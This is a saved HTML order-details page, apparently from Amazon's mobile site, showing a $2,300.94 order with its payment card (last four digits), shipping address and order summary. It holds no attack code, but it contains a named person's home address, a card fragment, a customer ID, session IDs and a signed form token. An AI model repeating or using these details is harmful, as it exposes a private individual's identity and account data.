t(b,c){a._modules[b]?c(a._modules[b]):(a._waiting[b]||(a._waiting[b]=[]),a._waiting[b].push(c),p(b))}function q(b,c){a._definitions[b]&&c.call(c)}function m(b,c,d){function e(a){return function(d){k[a]=d;f++;f>=b.length&&!h&&(h=!0,c.apply(c,k))}}if(0===b.length)c.call(c);else{for(var f=0,k=[],h=!1,g=0,l=b.length;g<l;g++){var m=b[g];k.push(null);t(m,e(g))}!0=== d&&window.setTimeout(function(){h||(h=!0,c.apply(c,k))},a._waitMilliseconds)}}function r(b,c,d){if(a._definitions[b])return!1;a._definitions[b]={id:b,deps:c,factory:d};a._waiting[b]&&p(b)}var a=this;a._waitMilliseconds=7E3;a._modules={};a._definitions={};a._waiting={};a._loading={};g("modules",a);g("when",m);g("define",r);g("isDefined",q);a.when=m;a.define=r;a.isDefined=q};PaymentsPortal2.ModuleSystem=l;PaymentsPortal2.modules=new l}})(); //]]>
                    </script>
                    <script type="text/javascript">
                      //<![CDATA[ PaymentsPortal2.widgetStartTime = (new Date()).getTime(); //]]>
                    </script>
                    <script type="text/javascript">
                      //<![CDATA[ PaymentsPortal2.modules.when(['clog'],function(clog){clog.setConfiguration({"sushiEelSourceGroup":"com.amazon.eel.ApertureService.NA.Prod.ClientSideMetricsData","isPmetLoggingOn":true,"foresterEndpoint":"https://fls-na.amazon.com/","defaultClient":"chainedLoggingClient","sushiEelEndPoint":"https://unagi-na.amazon.com/","pmetPostBackChannel":"/1/action-impressions/1/OP/payments-portal/action/","timberLoggingChannel":"/1/payments-portal-log/1/OP/","isTimberLoggingOn":true,"isSushiEelLoggingOn":true});clog.setPmetHeaders({"method":"ViewPaymentPlanSummary","marketplaceId":"ATVPDKIKX0DER","service":"PaymentsPortalWidgetService","client":"YA:OD","session":"136-3359381-5388641","requestId":"6N54YY3EV0370MXJX1CC","marketplace":"ATVPDKIKX0DER"});}); //]]>
                    </script>
                    <div data-pmts-component-id="pp-Crd1Is-1" class="a-row pmts-portal-root-TkLqvwO3dxkc pmts-portal-component pmts-portal-components-pp-Crd1Is-1">
                      <div class="a-column a-span12 pmts-payment-instrument-billing-address">
                        <div data-pmts-component-id="pp-Crd1Is-2" class="a-box a-first pmts-payment-instrument pmts-portal-component pmts-portal-components-pp-Crd1Is-2">
                          <div class="a-box-inner">
                            <div class="a-row a-spacing-none">
                              <div class="a-row pmts-payments-instrument-header"><span class="a-text-bold">Payment method</span></div>
                            </div>
                            <div class="a-row pmts-payments-instrument-details">
                              <ul class="a-unordered-list a-nostyle a-vertical no-bullet-list pmts-payments-instrument-list">
                                <li class="a-spacing-micro pmts-payments-instrument-detail-box-paystationpaymentmethod"><span class="a-list-item">Visa<span class="a-letter-space"></span><span class="a-color-base">ending in 3974</span></span></li>
                              </ul>
                            </div>
                          </div>
                        </div>
                      </div>
                    </div>
                    <script type="text/javascript">
                      //<![CDATA[ (function() {     PaymentsPortal2.modules.when(['widget-factory'], function(wf) {      var options = {"testAjaxAuthenticationRequired":"false","clientId":"YA:OD","serializedState":"4-MS3bNbowpICegU8XOSp43eDIF9lXgYWRoDH_9cit2joJQD8ZYjce-O0UGcX54uKRFJeYzzYpgwsPlDXkqUdELskC8b8f0NCv_I8SKdlLxxXXoMJ2CW8zQcq_Xp5gKwvTLv5rAYRfABoC0yG2PVcKTsUHrlTVgyty2CI0AcD5gxNDIl7Rlo61qG1TQRcu9PSp_sVX6VBHuj1sSx3M000o6q8mNISJeelu-AoSc0bitHF4RxEHyh6ffIdLNdwt8sHgjKbchLAuxzv4nmYGqpYFEm_OhnpJTqxpVlchPBFvG-mPFAtIdBANNzQhfXxB7nJyaW3cNbMdNy5xZeZV3maYsXvR51Tb1sNjItsdM96QcMFNF7LDj5sMtc2N9GbpiU0amrHUqbWWvYZg5Dn2YHjapVKM5lzzgSYGYiiG4siTNb7yNxBK04ocEZcdTopzBZ5rPJd7Gx_5KTwMFI1aL75zQivgAP7Y-DzsFnMJ3YoGICmhc_Ad4vdsFZYvdYSv-aRJ62qjLbhG0ZnOCAeiLYYcj5cQFAqsTpimoseLY1kQWhWzedPrg5_yfPYdOsHN59OffrHFeC8BMQNOyxildWVUwHrBXv5UBW6tYqibx2r0fTe-EBQBIOaZtNp7hdLXkyPLaP86HhXyWRrFyTl_211MROz9ec85wrjAEU17enAe2yzP9PRWC7NZwr2yyBsA2l7DYAlH3Dj-TZNCPInLlhTE8a7RY9uIdvOiwe0M0z8EFQaEMzgo4zO3X1Re40vuwXR3ScF7jegds9chYLBaGdArr4zqjd6T9pbk8BqiJKXQP8crhJFb8Q9YNwty3NwxElCWm_uczt6lRcPe30l-07hQkRNsQpYzy65Y1pUbUSk3SgJ88wxp0KbRrwfbkTmuiwVoZjIAUBDtlRf70vgugfvikUQcpIeyzdrBTc8uT_lfh3fj-ZAPBj5xchzS1k6loLQy-MJdGIBxyAhBZ6UIyH8SP7VmS1Ywvk_ULbxQt0H7ou5MyGZpcuL1gO8DtsWDi7N2uM2EZDefHm0NGCxQVKOt9Ml9PKWrgS-N1p9T4HFXt7Be91ZPuG1R3cJFQ6Iu8bNGXI6j_hKkcBfy-NOYv_YXxSkCfRUTQQIC28f9dnqPk-5vp9XG1j6oLvh9ZtPIL-3_wdWu3ywnbpFy8deivDTgBhsFymRazLyqw-1s8e0Z6XCKOHqvTlmA8iT8Acf6o_8WBBCSzX6t0DOYsHvQv-dyfFEGCImv9APF9rieoVCjj-Y9ffbne5xsKx_IW7VjQpJ9WbAwtUSqZwQX6P1yJ-eydDhBq8RaKcZtLFINa0s0bS9oAXJz1JrmNUgrnK4PLprqQdVJ8Gz0ZZqK7m-F8Pt0QnG398wnKozqL_kxZ7hkNXllIFmQX3Mfs6utL4hwWVBMaMvU00pXY41P-tRC1u25bS7WE2AJD66I2VEN3hAZn28wDw","marketplaceId":"ATVPDKIKX0DER","deviceType":"mobile","locale":"en_US","customerId":"A2SYRYIPCBR72I","sessionId":"136-3359381-5388641","requestId":"6N54YY3EV0370MXJX1CC","widgetInstanceId":"TkLqvwO3dxkc","continueRequestAjaxSubstitutionEnabled":true,"clientLoggingWeblabEnabledValue":"false"};      var data = [{"elementReferences":{},"elementDOMEventMethodBindings":[],"data":{},"id":"pp-Crd1Is-2","elementReferenceTagType":{},"type":"PaymentInstrumentComponent"}];      var localizedStrings = {};      var widgetCreationEpochMilliseconds = 1724857081596;      wf.create('ViewPaymentPlanSummary', options, data, localizedStrings, widgetCreationEpochMilliseconds);     });    }()); //]]>
                    </script>
                  </ul>
                </div>
              </div><!-- for list-->
            </div><!-- for section -->








          </div>















          <div class="" data-component="shippingAddress">











            <div class="a-section"><br>
              <h3 class="a-box-title"> Shipping address </h3><!--for heading -->
              <div class="a-box a-vertical">
                <div class="a-box-inner a-padding-none">
                  <ul class="a-unordered-list a-nostyle a-box-list">
                    <li><span class="a-list-item">
                        <div class="a-section a-padding-medium">	Christy Dietrich<br> 900 Lanark Dr<br>Wasilla, Alaska 99654<br>United States<br><br> </div>
                      </span></li>
                  </ul>
                </div>
              </div><!-- for list-->
            </div><!-- for section-->








          </div>















          <div class="" data-component="kycXborderInfo">


















          </div>















          <div class="" data-component="kycInfo">


















          </div>















          <div class="" data-component="shippingPreference">


















          </div>















          <div class="" data-component="gcItems">


















          </div>















          <div class="" data-component="svaOrder">


















          </div>















          <div class="" data-component="rechargeOrder">


















          </div>















          <div class="" data-component="digitalItems">


















          </div>















          <div class="" data-component="orderTotal">











            <div class="a-section"><br>
              <h3 class="a-box-title"> Order Summary </h3><!-- for heading-->
              <div class="a-box a-vertical">
                <div class="a-box-inner a-padding-none">
                  <ul class="a-unordered-list a-nostyle a-box-list">
                    <li id="od-subtotals"><span class="a-list-item">
                        <div class="a-section a-padding-medium">
                          <div class="a-row">
                            <div class="a-column a-span7">
                              <p class="a-color-base"> Items: </p><!-- paragraph-->
                            </div> <!-- for grid_column-->
                            <div class="a-column a-span5 a-span-last">
                              <p class="a-text-right a-size-base a-color-base"> $2,199.00  </p><!-- for paragraph-->
                            </div> <!-- for grid_column-->
                          </div> <!-- for grid_row-->
                          <div class="a-row">
                            <div class="a-column a-span7">
                              <p class="a-color-base"> Shipping &amp; Handling: </p><!-- paragraph-->
                            </div> <!-- for grid_column-->
                            <div class="a-column a-span5 a-span-last">
                              <p class="a-text-right a-size-base a-color-base"> $0.00 </p><!-- for paragraph-->
                            </div> <!-- for grid_column-->
                          </div> <!-- for grid_row-->
                          <div class="a-row">
                            <div class="a-column a-span7">
                              <p class="a-color-base"> Total Before Tax: </p><!-- paragraph-->
                            </div> <!-- for grid_column-->
                            <div class="a-column a-span5 a-span-last">
                              <p class="a-text-right a-size-base a-color-base"> $2,199.00  </p><!-- for paragraph-->
                            </div> <!-- for grid_column-->
                          </div> <!-- for grid_row-->
                          <div class="a-row">
                            <div class="a-column a-span7">
                              <p class="a-color-base"> Estimated Tax Collected: </p><!-- paragraph-->
                            </div> <!-- for grid_column-->
                            <div class="a-column a-span5 a-span-last">
                              <p class="a-text-right a-size-base a-color-base"> 
        
            
            
        $101.94
    

</p><!-- for paragraph-->
                            </div> <!-- for grid_column-->
                          </div> <!-- for grid_row-->
                          <div class="a-row">
                            <div class="a-column a-span7"> <span class="a-size-medium a-text-bold"> Order Total </span><!--for text--> </div> <!-- for grid_column-->
                            <div class="a-column a-span5 a-span-last">
                              <p id="od-formatted-total" class="a-text-right a-size-medium a-color-price price a-text-bold">
                        
                            
                            
                        $2,300.94
                    
                
             </p><!--for text-->
                            </div> <!-- for grid_column-->
                          </div> <!-- for grid_row-->
                        </div><!--for section-->
                      </span></li><!--for list_item-->
                  </ul>
                </div>
              </div><!-- for box list-->
            </div><!-- for section -->








          </div>






          <script type="text/javascript">
            if (ue) {
              uet('fn');
            }
          </script>



          <script type="text/javascript">
            if (ue) {
              uet('af');
            }
          </script>



          <script type="text/javascript">
            if (ue) {
              uet('cf');
            }
          </script>





          <script type="text/javascript">
            (function(f) {
              var _np = (window.P._namespace(""));
              if (_np.guardFatal) {
                _np.guardFatal(f)(_np);
              } else {
                f(_np);
              }
            }(function(P) {
              window.P && P.register('sp.load.js');
            }));
          </script>

          <!--&&&Portal&Delimiter&&&--><!-- sp:end-feature:host-atf -->
          <!-- sp:feature:nav-btf -->
          <!-- NAVYAAN BTF START -->
          <script type="text/javascript">
            var component = 'navCF';
            try {
              (window.AmazonUIPageJS ? AmazonUIPageJS : P).register(component, function() {
                return {};
              });
            } catch (e) {
              var error = e.message.toLowerCase();
              var alreadyRegisteredMsg = component + ' already registered';

              if (error.indexOf(alreadyRegisteredMsg.toLowerCase()) === -1) {
                throw (e);
              }
            }
          </script>


          <!-- NAVYAAN BTF END -->
          <!-- sp:end-feature:nav-btf -->
          <!-- sp:feature:host-btf -->














          <link rel="stylesheet" href="https://c.media-amazon.com/images/I/01FvA6+tfcL.css?AUIClients/DramAssets">
          <script>
            (window.AmazonUIPageJS ? AmazonUIPageJS : P).load.js('https://c.media-amazon.com/images/I/01UiZXT0lxL.js?AUIClients/DramAssets');
          </script>
        </div>








      </div>



    </div>
  </div>
  </div>
  <link rel="stylesheet" href="https://c.media-amazon.com/images/I/01FvA6+tfcL.css?AUIClients/DramAssets">
  <script>
    (window.AmazonUIPageJS ? AmazonUIPageJS : P).load.js('https://c.media-amazon.com/images/I/01UiZXT0lxL.js?AUIClients/DramAssets');
  </script>
  </div>








  </div>




  </div>
  </div>

  <footer class="nav-mobile nav-ftr-batmobile">

    <div id="nav-ftr" class="nav-t-footer-basicNoAuth nav-sprite-v3">




      <div class="icp-container-mobile">


        <style type="text/css">
          #icp-touch-link-language {
            display: none;
          }
        </style>


        <a href="#" aria-label="Choose a language for shopping." class="icp-touch-link-2" id="icp-touch-link-language">
          <div class="icp-nav-globe-img-2 icp-mobile-globe-2"></div><span class="icp-color-base">English</span><span class="nav-arrow icp-up-down-arrow"></span>
        </a>







        <style type="text/css">
          #icp-touch-link-country {
            display: none;
          }
        </style>
        <a href="#" aria-label="Choose a country/region for shopping." class="icp-touch-link-2" id="icp-touch-link-country">
          <span class="icp-flag-3 icp-flag-3-us"></span><span class="icp-color-base">United States</span>
        </a>


      </div>




      <ul class="nav-ftr-horiz">
        <li class="nav-li">
          <a href="#" id="" class="nav-a">Conditions of Use</a>

        </li>
        <li class="nav-li">
          <a href="#" id="" class="nav-a">Privacy Notice</a>

        </li>
        <li class="nav-li">
          <a href="#" id="" class="nav-a">Consumer Health Data Privacy Disclosure</a>

        </li>
        <li class="nav-li">
          <a href="" id="" class="nav-a">Your Ads Privacy Choices</a>

        </li>
        <li class="nav-li">

          <span id="nav-icon-ccba" class="nav-sprite"></span>
        </li>
      </ul>

      <div id="nav-ftr-copyright">
        © 1996-2024, Amazon.com, Inc. or its affiliates
      </div>
      <div id="nav-ftr-legal">
      </div>


  </footer>
  </div>
  <div id="a-popover-root" style="z-index:-1;position:absolute;"></div>

  <div class="submit-loading submit-loading-off">
    <div class="spinner-container"> <span class="spinner-img"></span> </div>
  </div>
  <div style="display:none">
    <form id="document-form" method="post" action="/documents/upload/v2" enctype="multipart/form-data">
      <input type="hidden" name="_utf8_enable" value="â??">
      <input type="hidden" name="AX-SessionID" value="257-8428492-9440954">
      <input type="hidden" name="AX-Destination" value="/documents/uploaded">
      <input type="hidden" name="AX-DocumentDisposition" value="file1=urn:alx:cls:18658cd3-9fe4-4aa2-aeae-23963501b4bc,file2=urn:alx:cls:18658cd3-9fe4-4aa2-aeae-23963501b4bc,file3=urn:alx:cls:18658cd3-9fe4-4aa2-aeae-23963501b4bc,file4=urn:alx:cls:18658cd3-9fe4-4aa2-aeae-23963501b4bc,file5=urn:alx:cls:18658cd3-9fe4-4aa2-aeae-23963501b4bc">
      <input type="hidden" name="AX-Signature" value="SHA256-RSA-V1,1816216379e,384,urn:alx:uid:7bc29e14-79a9-4320-8a53-eafd6094d1ee,1,d30d03f25cd9e1ade4c64a8039cc18fb4b1725c6d4f2789a4caae4a9f06ba948c350ce605ed4bb921e99eae45470238e87eb53594a199f40b51a772a6e54b9ea9a9b7ca4e0ab27b17882fd5835e6f35d584dcb478c1494c742e90dc62dd5a95940f12375d8e47286cdbc83f911516f5bcc37b44c2aba73a25132584cf2432a24a771d5b4e6c328f535b5eba2b63dd6caeb618bc760529c4a2a5cde31d0ef9028ecf545c2268775336f9e1fba014acbf45460ec9f9eb7dc668d691c56fb063249a842b9b92db2e76fb251d2a6330af8961a0da20710189d5d2f97402c8589e0d193908b52a4bf1046bad2edd893b1ed9ea12e62a18cff0130c2f07449170b4bdf">
    </form>
  </div>
  <div id="a-white"></div>
</body>

</html>